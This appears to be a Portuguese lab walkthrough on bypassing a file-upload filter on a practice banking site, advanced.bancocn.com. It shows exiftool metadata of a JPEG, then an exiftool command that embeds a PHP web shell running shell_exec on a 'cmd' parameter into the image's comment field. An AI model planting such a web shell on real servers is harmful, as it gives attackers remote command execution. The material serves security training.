advanced.bancocn.com

Esse é um cenário diferente. Por ser um servidor mais difícil de invadir, precisamos adotar técnicas novas.
Vemos que o site não aceita nenhum dos bypasses tentados anteriormente
Podemos tentar:
	cmd2.php5?.jpg // tudo após o ? é invalidado na URL, mas ainda assim não foi possível

Abrindo o Burp Suite e inspecionando o que ocorre por trás, notamos que o site:
1- Pode estar verificando o content-type e vendo que se trata de um arquivo .php, bloqueando o envio.
2- Pode estar verificando o nome do arquivo, notando que se trata de um arquivo .php
		
Desistimos de fazer upload de arquivos PHP. O servidor realmente possui uma proteção forte contra isso.
Entretanto, há uma propriedade interessante nas imagens: os metadados.
Podemos manipular esses metadados e injetar um código PHP dentro da imagem. 
Assim, continuará sendo um arquivo JPG, mas com código PHP injetado.

exiftool imagem.jpg

ExifTool Version Number         : 12.57
File Name                       : Cat03.jpg
Directory                       : .
File Size                       : 280 kB
File Modification Date/Time     : 2025:10:09 16:37:38-03:00
File Access Date/Time           : 2025:10:09 16:37:38-03:00
File Inode Change Date/Time     : 2025:10:09 16:37:38-03:00
File Permissions                : -rw-r--r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.02
Exif Byte Order                 : Big-endian (Motorola, MM)
Orientation                     : Horizontal (normal)
X Resolution                    : 72
Y Resolution                    : 72
Resolution Unit                 : inches
Software                        : Adobe Photoshop CS4 Windows
Modify Date                     : 2009:01:31 22:25:45
Color Space                     : Uncalibrated
Exif Image Width                : 1600
Exif Image Height               : 1598
Compression                     : JPEG (old-style)
Thumbnail Offset                : 332
Thumbnail Length                : 5620
IPTC Digest                     : 00000000000000000000000000000000
Displayed Units X               : inches
Displayed Units Y               : inches
Print Style                     : Centered
Print Position                  : 0 0
Print Scale                     : 1
Global Angle                    : 30
Global Altitude                 : 30
URL List                        : 
Slices Group Name               : Cat03
Num Slices                      : 1
Pixel Aspect Ratio              : 1
Photoshop Thumbnail             : (Binary data 5620 bytes, use -b option to extract)
Has Real Merged Data            : Yes
Writer Name                     : Adobe Photoshop
Reader Name                     : Adobe Photoshop CS4
Photoshop Quality               : 8
Photoshop Format                : Standard
XMP Toolkit                     : Adobe XMP Core 4.2.2-c063 53.352624, 2008/07/30-18:12:18
Creator Tool                    : Adobe Photoshop CS4 Windows
Create Date                     : 2009:01:31 22:23:29-02:00
Metadata Date                   : 2009:01:31 22:25:45-02:00
Format                          : image/jpeg
Color Mode                      : RGB
Instance ID                     : xmp.iid:5FC4B6DDF6EFDD11A70DB6F9E64FC18A
Document ID                     : xmp.did:5FC4B6DDF6EFDD11A70DB6F9E64FC18A
Original Document ID            : xmp.did:5FC4B6DDF6EFDD11A70DB6F9E64FC18A
Native Digest                   : 256,257,258,259,262,274,277,284,530,531,282,283,296,301,318,319,529,532,306,270,271,272,305,315,33432;64A91CE08E3A0B1024024F26145E54AE
History Action                  : created
History Instance ID             : xmp.iid:5FC4B6DDF6EFDD11A70DB6F9E64FC18A
History When                    : 2009:01:31 22:25:45-02:00
History Software Agent          : Adobe Photoshop CS4 Windows
DCT Encode Version              : 100
APP14 Flags 0                   : (none)
APP14 Flags 1                   : (none)
Color Transform                 : YCbCr
Image Width                     : 1600
Image Height                    : 1598
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:4:4 (1 1)
Image Size                      : 1600x1598
Megapixels                      : 2.6
Thumbnail Image                 : (Binary data 5620 bytes, use -b option to extract)

Injetando o código:
exiftool -comment="<?php echo shell_exec(\$_GET[\"cmd\"]) ?>" Cat03.jpg

Dessa forma, será possível fazer upload da imagem com o código dentro
